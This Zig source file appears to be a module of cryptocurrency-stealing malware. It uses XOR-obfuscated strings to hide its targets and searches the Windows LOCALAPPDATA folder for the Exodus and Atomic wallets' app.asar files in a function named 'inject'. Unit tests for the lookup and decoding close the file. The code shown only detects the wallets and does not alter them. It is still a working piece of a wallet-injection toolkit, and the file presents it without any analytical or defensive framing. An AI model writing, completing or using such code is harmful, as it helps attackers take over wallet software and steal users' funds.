const std = @import("std");
const hash = @import("../types/hash.zig");

pub const InjectionResult = struct {
    exodus: bool,
    atomic: bool,
};

const E = struct {
    pub const exodus_pattern = hash.xorEncrypt("Exodus");
    pub const atomic_pattern = hash.xorEncrypt("atomic");
    pub const local_app_data = hash.xorEncrypt("LOCALAPPDATA");
    pub const exodus_asar = hash.xorEncrypt("app.asar");
    pub const resources = hash.xorEncrypt("resources");
};

fn dirExists(path: []const u8) bool {
    var dir = std.fs.openDirAbsolute(path, .{}) catch return false;
    dir.close();
    return true;
}

fn findExodusWallet(allocator: std.mem.Allocator, local: []const u8) bool {
    var exodus_buf: [E.exodus_pattern.len]u8 = undefined;
    hash.xorDecrypt(&E.exodus_pattern, &exodus_buf);
    var resources_buf: [E.resources.len]u8 = undefined;
    hash.xorDecrypt(&E.resources, &resources_buf);
    var asar_buf: [E.exodus_asar.len]u8 = undefined;
    hash.xorDecrypt(&E.exodus_asar, &asar_buf);

    const exodus_dir = std.fs.path.join(allocator, &[_][]const u8{ local, &exodus_buf }) catch return false;
    defer allocator.free(exodus_dir);

    if (!dirExists(exodus_dir)) return false;

    var dir = std.fs.openDirAbsolute(exodus_dir, .{ .iterate = true }) catch return false;
    defer dir.close();

    var iter = dir.iterate();
    while (iter.next() catch return false) |entry| {
        if (entry.kind != .directory) continue;
        if (!std.mem.startsWith(u8, entry.name, "app-")) continue;

        const res_dir = std.fs.path.join(allocator, &[_][]const u8{ exodus_dir, entry.name, &resources_buf }) catch continue;
        defer allocator.free(res_dir);

        if (!dirExists(res_dir)) continue;

        const asar_path = std.fs.path.join(allocator, &[_][]const u8{ res_dir, &asar_buf }) catch continue;
        defer allocator.free(asar_path);

        var file = std.fs.openFileAbsolute(asar_path, .{}) catch continue;
        file.close();
        return true;
    }

    return false;
}

fn findAtomicWallet(allocator: std.mem.Allocator, local: []const u8) bool {
    var atomic_buf: [E.atomic_pattern.len]u8 = undefined;
    hash.xorDecrypt(&E.atomic_pattern, &atomic_buf);
    var resources_buf: [E.resources.len]u8 = undefined;
    hash.xorDecrypt(&E.resources, &resources_buf);
    var asar_buf: [E.exodus_asar.len]u8 = undefined;
    hash.xorDecrypt(&E.exodus_asar, &asar_buf);

    const full = std.fs.path.join(allocator, &[_][]const u8{ local, &atomic_buf, &resources_buf, &asar_buf }) catch return false;
    defer allocator.free(full);

    var file = std.fs.openFileAbsolute(full, .{}) catch return false;
    file.close();
    return true;
}

pub fn inject(allocator: std.mem.Allocator) InjectionResult {
    var local_app_data_buf: [E.local_app_data.len]u8 = undefined;
    hash.xorDecrypt(&E.local_app_data, &local_app_data_buf);

    const local = std.process.getEnvVarOwned(allocator, &local_app_data_buf) catch {
        return InjectionResult{ .exodus = false, .atomic = false };
    };
    defer allocator.free(local);

    return InjectionResult{
        .exodus = findExodusWallet(allocator, local),
        .atomic = findAtomicWallet(allocator, local),
    };
}

const testing = std.testing;

test "inject returns both false when wallets not found" {
    const result = inject(testing.allocator);
    try testing.expect(!result.exodus);
    try testing.expect(!result.atomic);
}

test "findExodusWallet returns false for nonexistent path" {
    try testing.expect(!findExodusWallet(testing.allocator, "C:\\__nonexistent__"));
}

test "findAtomicWallet returns false for nonexistent path" {
    try testing.expect(!findAtomicWallet(testing.allocator, "C:\\__nonexistent__"));
}

test "E values decrypt correctly" {
    var buf: [E.exodus_pattern.len]u8 = undefined;
    hash.xorDecrypt(&E.exodus_pattern, &buf);
    try testing.expectEqualSlices(u8, "Exodus", &buf);
}
